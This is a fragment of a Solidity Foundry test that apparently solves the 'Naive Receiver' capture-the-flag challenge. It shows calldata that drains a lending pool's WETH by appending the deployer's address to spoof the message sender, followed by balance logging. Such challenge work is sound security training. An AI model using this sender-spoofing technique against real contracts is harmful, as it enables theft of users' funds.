...
contract NaiveReceiverChallenge is Test {
    ...
    function test_naiveReceiver() public checkSolvedByPlayer {
        ...
        callDatas[10] =  abi.encodePacked(
            abi.encodeCall(pool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))), bytes32(uint256(uint160(deployer))));
        ...
        console.log("Deployer Deposit: ", pool.deposits(deployer));
        console.log("Pool Balance: ", weth.balanceOf(address(pool)));
        console.log("FWDers Balance: ", weth.balanceOf(address(forwarder)));
        console.log("Receiver Balance: ", weth.balanceOf(address(receiver)));
        console.log("Deployer Balance: ", weth.balanceOf(address(deployer)));
